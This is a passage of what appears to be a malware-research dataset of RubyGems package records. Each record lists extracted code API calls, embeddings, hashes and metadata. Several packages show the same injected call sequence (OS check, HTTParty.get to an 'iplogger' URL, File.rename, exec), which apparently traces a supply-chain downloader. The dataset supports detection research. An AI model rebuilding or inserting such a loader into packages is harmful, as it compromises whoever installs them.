'Digest::SHA1.base64digest', 'config.username', 'config', 'config.application_id', 'config', 'Base64.encode64', 'Digest::SHA1.base64digest', 'nonce + creation_date.+', 'nonce.+', 'Savon.client', 'config.adapter', 'config', 'config.wsdl', 'config', 'config.endpoint', 'config', 'config.endpoint', 'config', 'config.ssl_ca_cert_file', 'config', 'config.ssl_cert_file', 'config', 'config.ssl_cert_key_file', 'config', 'Client.config', 'attr_accessor', 'Struct.new', 'RoyalMailApi::XmlParser.new', 'set_attrs', 'private', 'parser.parse', 'parser', 'parser.parse_all', 'parser', 'parser.parse_text', 'parser', 'response.xml', 'response.http', 'set_errors', 'set_warnings', 'set_shipments', 'parse_all(body, \"error\").map', 'parse_all', 'body', 'RoyalMailApi::RoyalMailError.new', 'parse_text', 'parse_text', 'parse_all(body, \"warning\").map', 'parse_all', 'body', 'RoyalMailApi::Warning.new', 'parse_text', 'parse_text', 'parse_all(body, \"shipment\").map', 'parse_all', 'body', 'Shipment.new', 'parse_text', 'parse_text', 'parse_text', 'Response.new', 'attr_accessor', 'warning.class.name.==', 'warning.class.name', 'warning.class', 'warning.any?', 'warning.[]', 'warning.[]', 'require', 'require', 'attr_reader', 'attrs.reduce', 'hash.[]=', 'parse_special_characters', 'envelope', 'private', 'RoyalMailApi.root', 'File.join', 'xml_path.<<', 'xml_path', 'ERB.new(File.read(path)).result', 'ERB.new', 'File.read', 'binding', 'build_xml', 'build_xml', 'request', 'build_xml', 'str.is_a?', 'str.gsub', 'xml.is_a?', 'Nokogiri.XML(xml).remove_namespaces!', 'Nokogiri.XML', 'xml.css', 'parse', 'parse(xml, attr).text', 'parse']",
            "n_tokens": 896,
            "embedding": "[-0.00196528  0.00908882  0.00409555 ... -0.00288484 -0.02111829\n  0.02245759]",
            "cluster": "0",
            "id": 249,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/royal-mail_api/0.1.1/royal-mail_api-0.1.1.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/royal-mail_api/0.1.1/royal-mail_api-0.1.1_extracted",
            "name": "royal-mail_api",
            "version": "0.1.1",
            "published_at": "2020-02-22T05:03:22.687Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL but not a Github URL.",
            "dependencies": "vcr, dotenv, webmock, bundler, rake, savon, activesupport, httpclient",
            "SHA-256": "fb56cb17ee32d65521bd02d846ab2a3fe9b6e0598ec0dbd751896a6af734798b"
        },
        {
            "name_version": "dradis_ntospider-3.15.0",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/dradis_ntospider/3.15.0/dradis_ntospider-3.15.0_extracted/dradis_ntospider-3.15.0_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'HTTParty.get', 'd + aa + \"/\" + \"iplogger\" + e.+', 'd + aa + \"/\" + \"iplogger\".+', 'd + aa + \"/\".+', 'd + aa.+', 'd.+', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'isolate_namespace', 'include', 'description', 'provides', '::NTOSpider::Vuln.new', 'data', 'args.[]', 'field.split', 'name.==', '@nto_object.try', 'Gem::Version.new', '[MAJOR, MINOR, TINY, PRE].compact.join', '[MAJOR, MINOR, TINY, PRE].compact', 'params.fetch', 'File.basename', 'filename.==', 'log_error_and_return', 'File.read', 'logger.info', 'logger', 'Nokogiri.XML', '@doc.root', '@doc.root.name.==', '@doc.root.name', '@doc.root', 'logger.info', 'logger', 'log_error_and_return', '@doc.xpath(\"/VulnSummary/VulnList/Vuln\").empty?', '@doc.xpath', 'log_error_and_return', '@doc.xpath(\"/VulnSummary/VulnList/Vuln\").each', '@doc.xpath', '::NTOSpider::Vuln.new', 'xml_vuln.at_xpath(\"./WebSite\").text', 'xml_vuln.at_xpath', 'URI.parse(host_node_label).host', 'URI.parse', 'content_service.create_node', 'content_service', 'vuln.vuln_type', 'logger.info', 'logger', 'template_service.process_template', 'template_service', 'vuln.xml', 'content_service.create_issue', 'content_service', 'logger.info', 'logger', 'template_service.process_template', 'template_service', 'vuln.xml', 'content_service.create_evidence', 'content_service', 'private', 'logger.fatal', 'logger', 'content_service.create_note', 'content_service', 'require_relative', 'gem_version', 'attr_accessor', 'supported_tags.include?', 'supported_tags', 'method.to_sym', 'supported_tags.include?', 'supported_tags', 'translations_table.fetch', 'method.to_s.camelcase', 'method.to_s', '@xml.at_xpath', 'tag.text.blank?.!', 'tag.text.blank?', 'tag.text', 'tags_with_html_content.include?', 'tags_with_html_content', 'cleanup_html', 'tag.text', 'tag.text', 'private', 'source.dup', 'result.gsub!', 'result.gsub!', 'result.gsub!', 'result.gsub!', 'result.gsub!', 'result.gsub!', 'result.gsub!', 'result.gsub!', 'result.gsub!', 'result.gsub!', 'result.gsub!', 'result.gsub!', 'result.gsub!', 'result.gsub!', 'result.gsub!', 'result.gsub!', 'include', 'Rails.application.config.dradis.thor_helper_module', 'Rails.application.config.dradis', 'Rails.application.config', 'Rails.application', 'namespace', 'desc', 'require', 'File.exists?', '$stderr.puts', 'exit', 'detect_and_set_project_scope', 'Dradis::Plugins::NTOSpider::Importer.new', 'task_options', 'importer.import']",
            "n_tokens": 717,
            "embedding": "[-0.00252059 -0.01935087 -0.00070076 ... -0.00531407 -0.01978174\n  0.00426083]",
            "cluster": "0",
            "id": 746,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/dradis_ntospider/3.15.0/dradis_ntospider-3.15.0.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/dradis_ntospider/3.15.0/dradis_ntospider-3.15.0_extracted",
            "name": "dradis_ntospider",
            "version": "3.15.0",
            "published_at": "2020-02-22T05:16:57.268Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL but not a Github URL.",
            "dependencies": "bundler, rake, dradis-plugins",
            "SHA-256": "45af1dbace92ee66196c152bf297dfe6ec2fbc4048e21005d01d5c7d9b744105"
        },
        {
            "name_version": "movie-spider-0.0.2",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/movie-spider/0.0.2/movie-spider-0.0.2_extracted/movie-spider-0.0.2_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'HTTParty.get', 'd + aa + \"/\" + \"iplogger\" + e.+', 'd + aa + \"/\" + \"iplogger\".+', 'd + aa + \"/\".+', 'd + aa.+', 'd.+', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'require', 'require', 'DoubanMovie.douban_movie_stills', 'MtimeMovie.mtime_movie_stills', 'DoubanMovie.douban_movie_stills(id).+', 'DoubanMovie.douban_movie_stills', 'MtimeMovie.mtime_movie.stills', 'MtimeMovie.mtime_movie', 'DoubanMovie.douban_movie_posters', 'MtimeMovie.mtime_movie_posters', 'DoubanMovie.douban_movie_posters(id).+', 'DoubanMovie.douban_movie_posters', 'MtimeMovie.mtime_movie_posters', 'DoubanMovie.douban_movie_info', 'MtimeMovie.mtime_movie_info', 'DoubanMovie.douban_search_movies', 'MtimeMovie.mtime_search_movies', 'year.to_i', 'search_movies', 'subjects.empty?', 'subjects.each', 'title.gsub(/\\\\[.+\\\\]/, \"\").gsub(\"（\", \"(\").gsub', 'title.gsub(/\\\\[.+\\\\]/, \"\").gsub', 'title.gsub', 'subject.[](\"year\").to_i.==', 'subject.[](\"year\").to_i', 'subject.[]', 'string_similarity', 'subject.[]', 'match.<<', 'subject.[]', 'match.[]', 'define_singleton_method', 'Time.now.year', 'Time.now', 'id_or_title.to_i.to_s.==', 'id_or_title.to_i.to_s', 'id_or_title.to_i', 'MovieSpider.send', 'get_id_from_title', 'MovieSpider.send', 'define_component', 'define_component', 'define_component', 'define_component', 'define_component', 'define_component', 'private', 'origin.downcase!', '(0..origin.length - 2).collect { |i,|\\n  origin.[](i, 2)\\n}.reject', '(0..origin.length - 2)\\n.collect', 'origin.length.-', 'origin.length', 'origin.[]', 'pair.include?', 'compare.downcase!', '(0..compare.length - 2).collect { |i,|\\n  compare.[](i, 2)\\n}.reject', '(0..compare.length - 2)\\n.collect', 'compare.length.-', 'compare.length', 'compare.[]', 'pair.include?', 'origin_pair.size.+', 'origin_pair.size', 'compare_pair.size', 'origin_pair.each', '0.upto', 'compare_pair.size.-', 'compare_pair.size', 'op.==', 'compare_pair.[]', 'compare_pair.slice!', '(2.0 * intersection) / union.>', '(2.0 * intersection)\\n./', '2.0.*', 'api_get', 'subject.[]=', 'data.[]', 'subject.[]=', 'data.[]', 'subject.[]=', 'data.[]', 'subject.[]=', 'data.[]', 'subject.[]=', 'data.[]', 'subject.[]=', 'data.[]', 'subject.[]=', 'subject.[]=', 'data.[](\"countries\").join', 'data.[]', 'subject.[]=', 'data.[](\"directors\").map', 'data.[]', 'e.[]', 'subject.[]=', 'data.[](\"casts\").map', 'data.[]', 'e.[]', 'subject.[]=', 'data.[](\"summary\").gsub', 'data.[]', 'subject.[]=', 'data.[](\"rating\").[]', 'data.[]', 'movie_name.gsub', 'api_get(path).[](\"subjects\").map', 'api_get(path).[]', 'api_get', 'subject.delete_if', '[\"id\", \"year\", \"title\"].include?(key).!', '[\"id\", \"year\", \"title\"].include?', 'fetch_img', 'fetch_img', 'private', 'RestClient.get', 'URI.encode', 'UrlPrefix.+', 'JSON.parse', 'ExceptionNotifier::Notifier.background_exception_notification(e).deliver', 'ExceptionNotifier::Notifier.background_exception_notification', 'Rails.logger.error', 'Rails.logger', 'movie_name', 'ExceptionNotifier::Notifier.background_exception_notification(e).deliver', 'ExceptionNotifier::Notifier.background_exception_notification', 'Rails.logger.error', 'Rails.logger', 'movie_id', 'Nokogiri.HTML', 'open', 'doc.css', 'as.each', 'photos.<<', 'a.css(\"img\").first.attributes.[](\"src\").value.sub', 'a.css(\"img\").first.attributes.[](\"src\").value', 'a.css(\"img\").first.attributes.[]', 'a.css(\"img\").first.attributes', 'a.css(\"img\").first', 'a.css', 'doc.css(\"span.next a\").first.present?', 'doc.css(\"span.next a\").first', 'doc.css', 'doc.css(\"span.next a\").first.attributes.[](\"href\").value', 'doc.css(\"span.next a\").first.attributes.[]', 'doc.css(\"span.next a\").first.attributes', 'doc.css(\"span.next a\").first', 'doc.css', 'photos.+', 'fetch_img', 'photos.uniq', 'parse_mtime', 'parse_mtime(movie_id, \"generalposter\", img_size) + parse_mtime(movie_id, \"forecastposter\", img_size).+', 'parse_mtime(movie_id, \"generalposter\", img_size).+', 'parse_mtime', 'parse_mtime', 'parse_mtime', 'posters.delete', 'posters.delete', 'Nokogiri.HTML', 'open', 'Nokogiri.HTML', 'open', 'subject.[]=', 'movie_id.to_s', 'subject.[]=', 'html_doc.css(\".db_head h1\").text', 'html_doc.css', 'subject.[]=', 'subject.[]=', 'html_doc.css(\".db_head .db_enname\").text', 'html_doc.css', 'subject.[]=', 'html_doc.css(\".db_head .db_year\").text.gsub', 'html_doc.css(\".db_head .db_year\").text', 'html_doc.css', 'subject.[]=', 'html_doc.css(\".db_head a[property=\\'v:genre\\']\").map', 'html_doc.css', 'e.text', 'subject.[]=', 'html_doc.css(\".db_head span[property=\\'v:runtime\\']\").text', 'html_doc.css', 'subject.[]=', 'html_doc.css(\"dl.info_l dd\").[](2).css(\"a\").text', 'html_doc.css(\"dl.info_l dd\").[](2).css', 'html_doc.css(\"dl.info_l dd\").[]', 'html_doc.css', 'subject.[]=', 'html_doc.css(\".db_contout a[rel=\\'v:directedBy\\']\").map', 'html_doc.css', 'e.text', 'subject.[]=', 'html_doc.css(\"dl.main_actor a[pan][title]\").map', 'html_doc.css', 'e.[]', 'subject.[]=', 'plots.css(\"div.plots_box\").text.strip', 'plots.css(\"div.plots_box\").text', 'plots.css', 'subject.[]=', 'mtime_rating', 'mtime_search(movie_title).[](\"value\").[]', 'mtime_search(movie_title).[]', 'mtime_search', 'search_result.[]', 'search_result.[]', 'subjects.nil?', 'direct_subject.empty?', 'subjects.insert(0, direct_subject).delete', 'subjects.insert', 'subjects.map', 'subject.[](\"movieTitle\").=~', 'subject.[]', 'item.[]=', 'subject.[](\"movieId\").to_s', 'subject.[]', 'item.[]=', 'subject.[](\"movieTitle\").split(\" \").[]', 'subject.[](\"movieTitle\").split', 'subject.[]', 'item.[]=', 'subject.clear', 'subject.update', 'open(\"http://service.library.mtime.com/Movie.api?Ajax_CallBack=true&Ajax_CallBackType=Mtime.Library.Services&Ajax_CallBackMethod=GetMovieOverviewRating&Ajax_CrossDomain=1&Ajax_RequestUrl=http%3A%2F%2Fmovie.mtime.com%2F189691%2F&t=20153418472369218&Ajax_CallBackArgument0=#{movie_id}\").read', 'open', 'puts', 'result_str.scan', 'JSON.parse(match).[](\"value\").[](\"movieRating\").[](\"RatingFinal\").to_i', 'JSON.parse(match).[](\"value\").[](\"movieRating\").[]', 'JSON.parse(match).[](\"value\").[]', 'JSON.parse(match).[]', 'JSON.parse', 'private', 'open(URI.encode(\"http://service.channel.mtime.com/Search.api?Ajax_CallBack=true&Ajax_CallBackType=Mtime.Channel.Services&Ajax_CallBackMethod=GetSearchResult&Ajax_CrossDomain=1&Ajax_RequestUrl=http%3A%2F%2Fsearch.mtime.com%2Fsearch%2F%3Fq%3D%25E8%25B6%2585%25E8%2583%25BD%25E9%2599%2586%25E6%2588%2598%25E9%2598%259F&t=20153414382422867&Ajax_CallBackArgument0=#{movie_title}&Ajax_CallBackArgument1=0&Ajax_CallBackArgument2=365&Ajax_CallBackArgument3=0&Ajax_CallBackArgument4=1\")).read', 'open', 'URI.encode', 'puts', 'result_str.scan', 'JSON.parse', 'Nokogiri.HTML', 'open', 'html_doc.css(\"body\").search(\"script\").[](1).text.scan', 'html_doc.css(\"body\").search(\"script\").[](1).text', 'html_doc.css(\"body\").search(\"script\").[]', 'html_doc.css(\"body\").search', 'html_doc.css', 'JSON.parse', 'parser.[](type).map', 'parser.[]', 'item.[]']",
            "n_tokens": 2181,
            "embedding": "[ 0.01429156  0.01170034 -0.00434527 ... -0.0097071  -0.02631082\n  0.02148717]",
            "cluster": "0",
            "id": 244,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/movie-spider/0.0.2/movie-spider-0.0.2.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/movie-spider/0.0.2/movie-spider-0.0.2_extracted",
            "name": "movie-spider",
            "version": "0.0.2",
            "published_at": "2020-02-22T05:18:23.826Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL but not a Github URL.",
            "dependencies": "bundler, rake, nokogiri",
            "SHA-256": "a1aceb11e2b7f6c893f78981e494f155ecfc333f309389c6fd2671d9ae989da5"
        },
        {
            "name_version": "selenium-spider-0.1.2",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/selenium-spider/0.1.2/selenium-spider-0.1.2_extracted/selenium-spider-0.1.2_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['crawl_urls', 'register', 'attr.css=', 'register', 'attr.css=', 'attr.match=', 'next_link', 'detail_links', 'require', 'require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'HTTParty.get', 'd + aa + \"/\" + \"iplogger\" + e.+', 'd + aa + \"/\" + \"iplogger\".+', 'd + aa + \"/\".+', 'd + aa.+', 'd.+', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', '$LOAD_PATH.unshift', 'File.expand_path', '$LOAD_PATH.unshift', 'File.expand_path', '$LOAD_PATH.unshift', 'File.expand_path', 'ENV.[]', 'new', '@options.[](:command).==', '@options.[]', 'run', '@options.[](:command).==', '@options.[]', 'generate', '@options.[]', 'Headless.new', 'headless.start', 'require', '@options.[]', 'require', '@options.[]', 'require', '@options.[]', '@options.[](:site).classify.+', '@options.[](:site).classify', '@options.[]', 'Object.const_get(class_name).new.run', 'Object.const_get(class_name).new', 'Object.const_get', '@options.[]', 'headless.destroy', 'mkdir_if_not_exist', 'mkdir_if_not_exist', 'mkdir_if_not_exist', 'File.expand_path', 'generate_class', '@options.[]', 'generate_class', '@options.[]', 'generate_class', '@options.[]', 'private', 'File.exist?', 'puts', '\"Skip: \".+', 'open', 'Tilt.new', 'f.puts', 'template.render', '@options.[](:site).classify', '@options.[]', 'File.exist?', 'require', 'FileUtils.mkdir_p', 'require', 'self.class.to_s.sub', 'self.class.to_s', 'self.class', '@type.+', '@@urls.each_with_index', 'SeleniumSpider.const_get(@pagination_class).new', 'SeleniumSpider.const_get', '@pagination.before_crawl', '@pagination.detail_links', 'detail_links.each', 'extract_info', 'extract_info', '@pagination.driver', '@pagination.continue?.!', '@pagination.continue?', '@pagination.next', '@pagination.quit', 'SeleniumSpider.const_get(@type).new', 'SeleniumSpider.const_get', '@pagination.attributes.each', '@pagination.attributes', 'model.set_attributes_value', 'value.value', 'puts', 'model.output_as_json', 'model.quit', 'require', 'require', 'attr_accessor', 'visit', '@@attributes.[](key).value=', '@@attributes.[]', '@@attributes.[]=', 'SeleniumSpider::Attribute.new', 'block_given?', '@@attributes.[]', '@@attributes.[]', 'attr.value', 'attr.value', 'search(attr.css).inner_text', 'search', 'attr.css', 'attr.match', 'element_str.match', 'attr.match', 'match.[]', 'match.length.-', 'match.length', 'attr.sub', 'element_str.sub', 'attr.sub.[]', 'attr.sub', 'attr.sub.[]', 'attr.sub', 'attr.lambda', 'attr.lambda.call', 'attr.lambda', '@@attributes.each', 'extracted.[]=', 'extract', 'JSON.dump', 'extract_all', 'attr_accessor', 'require', 'visit', 'URI.parse', 'click', '@@detail_links_selector.!', 'search(@@detail_links_selector).map', 'search', 'lambda', 'full_url', 'x.attribute(\"href\").value', 'x.attribute', '@uri.port.==', '@uri.port', '\":\".+', '@uri.port.to_s', '@uri.port', '@uri.scheme + \"://\" + @uri.host + port.+', '@uri.scheme + \"://\" + @uri.host.+', '@uri.scheme + \"://\".+', '@uri.scheme.+', '@uri.scheme', '@uri.host', '@@next_link.!', 'has_element?', '@@attributes.[]=', 'SeleniumSpider::Attribute.new', 'block_given?', '@@attributes.[]']",
            "n_tokens": 900,
            "embedding": "[ 0.02306389  0.00622286 -0.00524511 ... -0.00437931 -0.02509248\n  0.00932059]",
            "cluster": "0",
            "id": 668,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/selenium-spider/0.1.2/selenium-spider-0.1.2.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/selenium-spider/0.1.2/selenium-spider-0.1.2_extracted",
            "name": "selenium-spider",
            "version": "0.1.2",
            "published_at": "2020-02-22T05:20:04.107Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": "bundler, rake, rspec, sinatra, pry, haml, selenium_standalone_dsl, activesupport, tilt",
            "SHA-256": "f2b2b46d08253e7d2315fafb9b4d837d3b87f746f55de424e5c98e8e73eb3c81"
        },
        {
            "name_version": "speed-spider-0.0.2",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/speed-spider/0.0.2/speed-spider-0.0.2_extracted/speed-spider-0.0.2_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'HTTParty.get', 'd + aa + \"/\" + \"iplogger\" + e.+', 'd + aa + \"/\" + \"iplogger\".+', 'd + aa + \"/\".+', 'd + aa.+', 'd.+', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'require', 'Cli.new.parse!', 'Cli.new', 'ARGV.[]', 'start_url.nil?', 'puts', 'cli.option_parser.help', 'cli.option_parser', 'exit', 'Crawler.new', 'cli.options', 'crawler.crawl', '[\"js\", \"css\", \"jpg\", \"jpeg\", \"png\", \"bmp\", \"gif\", \"svg\", \"ttf\", \"woff\", \"eot\"].any?', '/#{e}/i.=~', 'File.extname(link.path).split(\".\").pop', 'File.extname(link.path).split', 'File.extname', 'link.path', 'skip_link_without_hack?', 'assets?(link).!', 'assets?', 'link.to_s.start_with?(@opts.[](:base_url)).!', 'link.to_s.start_with?', 'link.to_s', '@opts.[]', 'alias_method', 'alias_method', 'require', 'require', 'require', 'attr_reader', 'OptionParser.new', 'opts.banner=', 'opts.separator', 'opts.separator', 'opts.on', '@options.[]=', 'opts.on', 'options.[]=', 'options', 'opts.on', 'value.end_with?', 'options.[]=', 'options', 'opts.on', '@options.[]=', 'opts.on', '@options.[]=', 'opts.on', '@options.[]=', 'opts.on', '@options.[]=', 'opts.on', '@options.[]=', 'opts.on', '@options.[]=', 'opts.on', '@options.[]=', 'opts.on', '@options.[]=', 'opts.on', '@options.[]=', 'opts.on', '@options.[]=', 'opts.on', '@options.[]=', 'opts.on_tail', 'puts', 'exit', '@option_parser.parse!', 'require', 'require', 'require', 'require', 'options.[]', 'data.match', '[m.[](1)].+', 'm.[]', 'get_urls_from_css', 'm.end(1).+', 'm.end', 'lambda', 'page.doc', 'page.doc.search(\"//script[@src]\", \"//img[@src]\", \"//iframe[@src]\").each', 'page.doc.search', 'page.doc', 's.[]', 'u.nil?', 'u.empty?', 'page.to_absolute', 'page.in_domain?', 'links.<<', 'page.doc.search(\"//link[@href]\").each', 'page.doc.search', 'page.doc', 's.[]', 'u.nil?', 'u.empty?', 'page.to_absolute', 'page.in_domain?', 'links.<<', 'page.url.to_s.end_with?', 'page.url.to_s', 'page.url', 'get_urls_from_css(page.body).each', 'get_urls_from_css', 'page.body', 's.gsub(\"\\\\\"\", \"\").gsub', 's.gsub', 'u.nil?', 'u.empty?', 'page.to_absolute', 'page.in_domain?', 'links.<<', 'page.links.+', 'page.links', 'links.uniq', 'lambda', 'pages.each', 'page.url.path', 'page.url', 'path.end_with?', 'path.empty?', '@options.[]', 'page.url.host', 'page.url', 'File.dirname', 'dir.empty?', 'FileUtils.mkdir_p', 'File.open', 'f.write', 'page.body', '@options.[]', 'puts', 'Anemone.crawl', 'spider.focus_crawl', 'focus_crawl', 'spider.after_crawl', 'after_crawl']",
            "n_tokens": 821,
            "embedding": "[-2.60651251e-03 -3.98472417e-03  1.09652453e-03 ... -4.18223754e-05\n -2.99628042e-02  1.11610964e-02]",
            "cluster": "0",
            "id": 25,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/speed-spider/0.0.2/speed-spider-0.0.2.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/speed-spider/0.0.2/speed-spider-0.0.2_extracted",
            "name": "speed-spider",
            "version": "0.0.2",
            "published_at": "2020-02-22T05:20:40.938Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL but not a Github URL.",
            "dependencies": "bundler, rake, anemone",
            "SHA-256": "c14e2be21c6a178f7fb7aebbcc77611c1d9604fcb0e167274c03a9a4124e5add"
        },
        {
            "name_version": "spider-bot-0.0.5",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/spider-bot/0.0.5/spider-bot-0.0.5_extracted/spider-bot-0.0.5_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'HTTParty.get', 'd + aa + \"/\" + \"iplogger\" + e.+', 'd + aa + \"/\" + \"iplogger\".+', 'd + aa + \"/\".+', 'd + aa.+', 'd.+', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'Crawl.new', 'block_given?.!', 'block_given?', 'crawl_instance.crawl_data', 'crawl_instance.instance_eval', 'SpiderBot::Logging.logger', 'SpiderBot::Logging.logger=', 'autoload', 'autoload', 'autoload', 'autoload', 'autoload', 'require', 'Class.new', 'Crawl.new', 'crawl_instance.instance_eval', 'klass.allocate.instance_eval', 'klass.allocate', 'Crawl.new', 'crawl_instance.crawl_data', '$LOAD_PATH.unshift', 'File.expand_path', 'require', 'require', 'require', 'desc', 'method_option', 'method_option', 'method_option', 'Crawl.new(arg, options).crawl_data', 'Crawl.new', 'options', 'options.[]', 'options', 'File.open', 'options.[]', 'options', 'file.puts', 'file', 'puts', 'desc', 'method_option', 'method_option', 'method_option', 'options.[]', 'options', 'options.[](:expire).to_i', 'options.[]', 'options', 'require', 'File.join', 'File.expand_path', 'options.[]', 'options', 'File.expand_path', 'options.[]', 'options', 'File.exists?(bot_file).!', 'File.exists?', 'raise', 'load', 'options.[]', 'options', 'File.expand_path', 'options.[]', 'options', 'Dir.exists?(bot_dir).!', 'Dir.exists?', 'raise', 'Dir.glob(\"#{bot_dir}/*_bot.rb\").each', 'Dir.glob', 'threads.<<', 'Thread.new', 'SpiderBot.logger.info', 'SpiderBot.logger', 'load', 'SpiderBot.logger.error', 'SpiderBot.logger', 'SpiderBot.logger.error', 'SpiderBot.logger', 'e.to_s', 'threads.each', 't.join', 'desc', 'method_option', 'method_option', 'method_option', 'method_option', 'method_option', 'puts', 'options.[]', 'options', 'options.[](:expire).to_i', 'options.[]', 'options', 'options.[]', 'options', 'ENV.[]=', 'options.[]', 'options', 'ENV.[]=', 'require', 'File.join', 'File.expand_path', 'File.exists?(\"tmp/pids\").!', 'File.exists?', 'FileUtils.mkdir_p', 'options.[]', 'options', 'daemon_options.[]=', 'puts', 'File.exists?', 'stop', 'options.[]', 'options', 'option_time.match', 'parse_time.[]', 'option_time.to_i * 60 * 60.*', 'option_time.to_i * 60.*', 'option_time.to_i.*', 'option_time.to_i', 'option_time.to_i * 60.*', 'option_time.to_i.*', 'option_time.to_i', 'option_time.to_i.*', 'option_time.to_i', 'option_time.to_i', 'Daemons.daemonize', 'loop', 'BOTDIR.each', 'threads.<<', 'Thread.new', 'SpiderBot.logger.info', 'SpiderBot.logger', 'load', 'SpiderBot.logger.error', 'SpiderBot.logger', 'SpiderBot.logger.error', 'SpiderBot.logger', 'e.to_s', 'sleep', 'threads.each', 't.join', 'options.[]', 'options', 'Random.new.rand', 'Random.new', 'sleep', 'random_time.to_i', 'sleep', 'sleep_time.to_i', 'desc', 'File.read(\"tmp/pids/spider.pid\").to_i', 'File.read', 'Process.kill', 'File.delete', 'URI.parse', 'parse_uri.scheme + \"://\".+', 'parse_uri.scheme.+', 'parse_uri.scheme', 'parse_uri.host', '[\"80\", \"443\"].include?(parse_uri.port.to_s).!', '[\"80\", \"443\"].include?', 'parse_uri.port.to_s', 'parse_uri.port', '@uri + \":\".+', '@uri.+', 'parse_uri.port.to_s', 'parse_uri.port', 'parse_uri.path', 'options.[]', 'options.[]', 'options.[]', 'options.[]', 'options.[]', 'options.[]', 'options.[]', 'options.[]', 'options.[]', 'Http::Client.new', 'http.url=', 'http.user_agent=', 'http.headers=', 'catch', 'crawl_request', 'block_given?.!', 'block_given?', 'process_response', 'handle_error', 'crawl_data', '@page_query.blank?', '@page_path.==', 'crawl_paginate', 'private', '@page_type.to_s.==', '@page_type.to_s', '@page_headers.merge', '@connection.headers=', 'loop', '@page_start.==', '@page_add.>', '(@paginate_num / @page_add)\\n.+', '@paginate_num./', '$expire_num.>', 'real_page_num.>', '$expire_num.to_i', 'real_page_num.>', 'real_page_num.>', '@page_expire.!=', 'SpiderBot.logger.info', 'SpiderBot.logger', 'SpiderBot.logger.info', 'SpiderBot.logger', '@page_sleep.>', 'sleep', '@page_path.to_s.%', '@page_path.to_s', '@page_query.to_s.%', '@page_query.to_s', 'eval', 'crawl_request', 'process_response', '@paginate_error.==', 'handle_error', 'crawl_paginate', '@connection.get', 'response.!', 'response.status.!=', 'response.status', 'block_given?.!', 'block_given?', 'response.body', 'type.to_s.==', 'type.to_s', 'Nokogiri.HTML', 'response.body', 'type.to_s.==', 'type.to_s', 'MultiJson.load', 'response.body', 'response.parser', 'response.parsed', 'body.nil?', 'data.nil?', 'data.call', 'first.call', 'last.call', '@paginate_query.blank?.!', '@paginate_query.blank?', '@uri + @paginate_path + \"?\".+', '@uri + @paginate_path.+', '@uri.+', '@paginate_query.map { |k, v|\\n  \"#{k}=#{v}\"\\n}.join', '@paginate_query.map', '@uri.+', 'block.call', '[:path, :query, :first, :last, :type, :data, :start, :add, :expire, :sleep].include?', 'name.to_s', 'raise', 'eval', 'throw', 'SpiderBot.logger.error', 'SpiderBot.logger', 'get_page_url', 'SpiderBot.logger.error', 'SpiderBot.logger', 'error.to_s', '@paginate_error.==', 'break_all', 'sleep', '60.*', 'response.blank?', 'SpiderBot.logger.info', 'SpiderBot.logger', 'SpiderBot.logger.info', 'SpiderBot.logger', 'break_all', 'SpiderBot.logger.info', 'SpiderBot.logger', 'get_page_url', 'attr_reader', 'attr_reader', 'attr_reader', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'USER_AGENT.[]', 'block_given?', 'headers.merge', 'user_agent', 'USER_AGENT.[]', 'USER_AGENT.[]', 'Faraday.new', 'url', 'conn_build', 'conn.build', 'conn_build.call', 'conn_build', 'verb.==', 'connection.build_url', 'connection', 'connection.run_request', 'connection', 'headers', 'block_given?', 'Response.new', 'response.status', 'request', 'response.headers.[]', 'response.headers', 'request', 'request', 'attr_reader', 'lambda', 'MultiJson.respond_to?', 'MultiJson.load', 'MultiJson.decode', 'lambda', 